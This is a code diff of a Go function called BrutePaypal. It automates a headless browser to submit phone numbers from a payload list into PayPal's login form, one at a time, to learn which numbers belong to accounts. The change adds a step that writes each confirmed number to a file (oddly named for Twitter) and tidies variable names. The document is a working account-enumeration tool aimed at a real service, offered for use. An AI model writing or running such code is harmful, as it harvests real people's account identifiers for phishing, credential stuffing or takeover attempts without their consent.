@@ -50,13 +50,12 @@ func BrutePaypal() {
 	firsAcess := true
 	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
 		isRestart := ""
-		PhoneNumber := payloads[indexPayload]
-		fmt.Println("Trying Phone Number:", PhoneNumber)
+		numberphone := payloads[indexPayload]
 		if errorUser != "" || firsAcess {
 			err := chromedp.Run(ctx,
 				chromedp.WaitVisible(`#email`, chromedp.ByID),
 				chromedp.Sleep(1*time.Second),
-				chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
+				chromedp.SendKeys(`#email`, numberphone, chromedp.ByID),
 				chromedp.Sleep((15/10)*time.Second),
 				chromedp.KeyEvent(kb.Enter),
 				chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
@@ -79,7 +78,7 @@ func BrutePaypal() {
 				err = chromedp.Run(ctx,
 					chromedp.WaitVisible(`#backToInputEmailLink`, chromedp.ByID),
 					chromedp.Evaluate(`document.getElementById("backToInputEmailLink").click()`, nil),
-					chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
+					chromedp.SendKeys(`#email`, numberphone, chromedp.ByID),
 					chromedp.Sleep((15/10)*time.Second),
 					chromedp.KeyEvent(kb.Enter),
 					chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
@@ -104,9 +103,10 @@ func BrutePaypal() {
 			}
 		}
 		if errorUser != "" {
-			fmt.Println("[-] User Not Exist:", PhoneNumber)
+			fmt.Println("[-] User Not Exist:", numberphone)
 		} else {
-			fmt.Println("[!] User Exist:", PhoneNumber)
+			WriteToFile("numbers-twitter.txt", numberphone+"\n", "./numberphone/")
+			fmt.Println("[+] User Exist:", numberphone)
 		}
 		time.Sleep(1 * time.Second)
 
